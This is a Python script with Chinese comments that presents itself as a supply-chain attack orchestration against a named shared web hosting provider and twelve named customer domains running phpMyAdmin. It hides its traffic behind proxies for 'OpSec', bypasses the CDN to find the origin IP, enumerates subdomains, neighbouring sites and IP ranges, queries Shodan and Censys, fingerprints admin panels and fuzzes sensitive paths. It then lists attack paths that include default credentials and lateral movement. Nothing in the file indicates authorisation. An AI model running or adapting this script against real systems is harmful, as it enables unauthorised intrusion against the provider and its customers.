"""
BlastZone 供应链攻击编排脚本.

对 blastzonewebhosting.com (共享主机服务商) 执行系统性供应链攻击:

    1. CDN Bypass → 找真实源 IP
    2. Asset Expansion → 子域名 + 旁站 + C段 + WHOIS
    3. Intel Aggregation → Shodan/Censys 查开放端口
    4. Panel Detection → 主机面板指纹识别
    5. Directory Fuzzing → 敏感路径探测
    6. Cross-Correlation → 关联 12 个 phpMyAdmin 客户

全程走代理 (ProxyGuard), 输出 JSON + 人类可读报告.

用法:
    python scripts/attack_blastzone_supply_chain.py
"""

import asyncio
import json
import sys
import os
import time
from typing import List, Dict, Optional

# 确保可以从项目根目录导入
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


# ============================================================
# 目标列表
# ============================================================

BLASTZONE_HOSTING = "blastzonewebhosting.com"
PMA_DOMAINS = [
    "artfulbullet.com", "ashleywestmark.com", "blastzonewebhosting.com",
    "myth-racing.com", "northwestrocketry.com", "nypower.org",
    "pembertontechnologies.com", "rasaero.com", "rocketflite.com",
    "rocketrydata.com", "scottsrockets.com", "technicopedia.com",
]


# ============================================================
# 代理守卫 (复用 huntaid.py 的 ProxyGuard)
# ============================================================

class ProxyGuard:
    """轻量代理守卫."""

    def __init__(self):
        self.session = None
        self._setup()

    def _setup(self):
        import requests
        self.session = requests.Session()
        self.session.verify = False
        # 尝试从 ProxyManager 获取代理
        try:
            from aiburp.proxy_manager import ProxyManager
            pm = ProxyManager()
            proxy = pm.get_proxy() or pm.start_clash()
            if proxy:
                self.session.proxies = {
                    'http': proxy,
                    'https': proxy,
                }
                print(f"[OpSec] 代理已配: {proxy}")
        except Exception as e:
            print(f"[OpSec] 未找到代理管理器: {e}")
            print("[OpSec] ⚠️ 使用无代理模式 (仅信息收集)")

    def close(self):
        if self.session:
            self.session.close()


# ============================================================
# 攻击步骤
# ============================================================

def step_cdn_bypass(domain: str, S) -> Dict:
    """步骤 1: CDN Bypass — 找真实源 IP."""
    print(f"\n{'='*60}")
    print(f"📡 Step 1: CDN Bypass for {domain}")
    print(f"{'='*60}")

    try:
        from aiburp.traffic.cdn_bypass import CDNBypass
        bypass = CDNBypass()
        result = asyncio.run(bypass.bypass(domain))
        print(f"  结果: {result.confidence} confidence")
        if result.origin_ip:
            print(f"  源 IP: {result.origin_ip}")
        if result.candidates:
            print(f"  候选: {result.candidates}")
        return {
            "domain": domain,
            "confidence": result.confidence,
            "origin_ip": result.origin_ip,
            "candidates": [str(c) for c in (result.candidates or [])],
            "cdn_detected": result.cdn_detected,
            "cdn_name": result.cdn_name,
        }
    except Exception as e:
        print(f"  ❌ Error: {e}")
        return {"domain": domain, "error": str(e)}


def step_asset_expand(domain: str, S) -> Dict:
    """步骤 2: Asset Expansion — 子域名 + 旁站 + C段."""
    print(f"\n{'='*60}")
    print(f"🔍 Step 2: Asset Expansion for {domain}")
    print(f"{'='*60}")

    try:
        from aiburp.traffic.asset_expander import AssetExpander

        async def expand():
            expander = AssetExpander()
            return await expander.expand(domain)

        result = asyncio.run(expand())

        print(f"  子域名: {len(result.subdomains)}")
        for sd in result.subdomains[:10]:
            print(f"    - {sd}")
        if len(result.subdomains) > 10:
            print(f"    ... and {len(result.subdomains) - 10} more")

        print(f"  IP: {result.ips}")
        print(f"  旁站: {result.neighbors}")
        print(f"  C段: {result.c_segment}")

        return {
            "domain": domain,
            "subdomains": result.subdomains,
            "ips": result.ips,
            "neighbors": result.neighbors,
            "c_segment": result.c_segment,
        }
    except Exception as e:
        print(f"  ❌ Error: {e}")
        return {"domain": domain, "error": str(e)}


def step_intel_lookup(domain: str, S) -> Dict:
    """步骤 3: Intel Aggregation — Shodan/Censys."""
    print(f"\n{'='*60}")
    print(f"🕵️ Step 3: Intel Lookup for {domain}")
    print(f"{'='*60}")

    try:
        from aiburp.traffic.intel_aggregator import IntelAggregator

        async def lookup():
            agg = IntelAggregator()
            return await agg.lookup_domain(domain)

        result = asyncio.run(lookup())
        print(f"  完成: {len(result.sources)} 数据源已查询")
        return {"domain": domain, "sources": list(result.sources)[:5]}
    except Exception as e:
        print(f"  ❌ Error: {e}")
        return {"domain": domain, "error": str(e)}


def step_panel_detect(domain: str, S) -> List[Dict]:
    """步骤 4: Panel Detection — 主机面板指纹识别."""
    print(f"\n{'='*60}")
    print(f"🖥️ Step 4: Panel Detection for {domain}")
    print(f"{'='*60}")

    try:
        from aiburp.traffic.hosting_panel_detect import detect_panels
        result = detect_panels(f"https://{domain}", session=S)
        panels = []
        for panel in result.panels:
            print(f"  ✅ {panel.panel_type} @ {panel.login_url}")
            print(f"     version={panel.version}, confidence={panel.confidence}")
            panels.append({
                "panel_type": panel.panel_type,
                "version": panel.version,
                "login_url": panel.login_url,
                "confidence": panel.confidence,
                "detect_method": panel.detect_method,
            })
        if not panels:
            print(f"  ❌ 未检测到已知面板")
        return panels
    except Exception as e:
        print(f"  ❌ Error: {e}")
        return []


def step_dir_fuzz(domain: str, S) -> List[str]:
    """步骤 5: Directory Fuzzing — 敏感路径探测."""
    print(f"\n{'='*60}")
    print(f"📁 Step 5: Directory Fuzzing for {domain}")
    print(f"{'='*60}")

    try:
        from aiburp.plugins.discovery import DirFuzzer
        fuzzer = DirFuzzer(S)
        base_url = f"https://{domain}"
        sensitive = fuzzer.scan(base_url, wordlist="sensitive", max_pages=30)
        found = []
        for path, status in sensitive[:15]:
            print(f"  {status} {base_url}{path}")
            found.append({"path": path, "status": status})
        if not found:
            print(f"  ❌ 未发现敏感路径")
        return found
    except Exception as e:
        print(f"  ❌ Error: {e}")
        return []


def step_cross_correlation(cdn_result: Dict, expand_result: Dict,
                           panel_results: List[Dict]) -> Dict:
    """步骤 6: Cross-Correlation — 关联分析."""
    print(f"\n{'='*60}")
    print(f"🔗 Step 6: Cross-Correlation Analysis")
    print(f"{'='*60}")

    analysis = {
        "target": BLASTZONE_HOSTING,
        "pma_customer_count": len(PMA_DOMAINS),
        "pma_customers": PMA_DOMAINS,
        "shared_hosting_evidence": [],
        "attack_paths": [],
        "summary": "",
    }

    # 证据 1: CDN 状态
    if cdn_result.get("cdn_detected"):
        analysis["shared_hosting_evidence"].append(
            f"CDN detected ({cdn_result.get('cdn_name')}), "
            f"origin IP: {cdn_result.get('origin_ip')}"
        )
    else:
        analysis["shared_hosting_evidence"].append("No CDN, direct IP accessible")

    # 证据 2: 子域名中的面板迹象
    subdomains = expand_result.get("subdomains", [])
    panel_keywords = ["whm", "cpanel", "plesk", "directadmin", "vesta",
                      "webmin", "panel", "admin", "billing", "support"]
    found_panels_sd = [s for s in subdomains
                       if any(kw in s.lower() for kw in panel_keywords)]
    if found_panels_sd:
        analysis["shared_hosting_evidence"].append(
            f"Panel-related subdomains: {found_panels_sd}"
        )

    # 证据 3: 检测到的面板
    if panel_results:
        types = [p["panel_type"] for p in panel_results]
        analysis["shared_hosting_evidence"].append(
            f"Detected panels: {types}"
        )

    # 攻击路径生成
    paths = []
    if panel_results:
        for p in panel_results:
            if p.get("default_creds"):
                paths.append(f"Panel {p['panel_type']} @ {p['login_url']} "
                           f"(try default creds)")
    if cdn_result.get("origin_ip"):
        paths.append(f"Direct origin IP: {cdn_result['origin_ip']} "
                    f"(bypass CDN, attack backend directly)")
    if expand_result.get("neighbors"):
        paths.append(f"Same-server neighbors: {expand_result['neighbors'][:5]} "
                    f"(potential lateral movement)")

    analysis["attack_paths"] = paths

    # 总结
    summary_parts = []
    if cdn_result.get("origin_ip"):
        summary_parts.append(f"源 IP: {cdn_result['origin_ip']}")
    if panel_results:
        summary_parts.append(f"面板: {len(panel_results)} 个")
    if expand_result.get("subdomains"):
        summary_parts.append(f"子域名: {len(expand_result['subdomains'])} 个")
    if expand_result.get("neighbors"):
        summary_parts.append(f"旁站: {len(expand_result['neighbors'])} 个")

    analysis["summary"] = "; ".join(summary_parts) if summary_parts else "未发现关键攻击面"
    print(f"  攻击路径: {len(paths)} 条")
    for p in paths:
        print(f"    → {p}")
    print(f"  总结: {analysis['summary']}")

    return analysis


# ============================================================
# 主流程
# ============================================================

def main():
    print("=" * 60)
    print("🔥 BlastZone 供应链攻击编排")
    print(f"   目标: {BLASTZONE_HOSTING}")
    print(f"   客户 phpMyAdmin 站: {len(PMA_DOMAINS)} 个")
    print("=" * 60)

    # 初始化代理
    guard = ProxyGuard()
    S = guard.session

    # 执行各步骤
    all_results = {}

    # Step 1: CDN Bypass
    cdn_result = step_cdn_bypass(BLASTZONE_HOSTING, S)
    all_results["cdn_bypass"] = cdn_result

    # Step 2: Asset Expansion
    expand_result = step_asset_expand(BLASTZONE_HOSTING, S)
    all_results["asset_expand"] = expand_result

    # Step 3: Intel Lookup
    intel_result = step_intel_lookup(BLASTZONE_HOSTING, S)
    all_results["intel"] = intel_result

    # Step 4: Panel Detection (主域名 + 找到的所有子域名/IP)
    panel_results = step_panel_detect(BLASTZONE_HOSTING, S)
    # 也对子域名做面板检测
    for sd in expand_result.get("subdomains", [])[:10]:
        try:
            sub_panels = step_panel_detect(sd, S)
            panel_results.extend(sub_panels)
        except Exception:
            pass
    all_results["panels"] = panel_results

    # Step 5: Directory Fuzzing
    dir_results = step_dir_fuzz(BLASTZONE_HOSTING, S)
    all_results["dir_fuzz"] = dir_results

    # Step 6: Cross-Correlation
    correlation = step_cross_correlation(cdn_result, expand_result, panel_results)
    all_results["correlation"] = correlation

    # 输出 JSON 报告
    report_path = f"reports/supply_chain_{BLASTZONE_HOSTING}_{int(time.time())}.json"
    os.makedirs("reports", exist_ok=True)
    with open(report_path, "w", encoding="utf-8") as f:
        json.dump(all_results, f, ensure_ascii=False, indent=2, default=str)
    print(f"\n📄 报告已保存: {report_path}")

    # 关闭代理
    guard.close()

    return all_results


if __name__ == "__main__":
    main()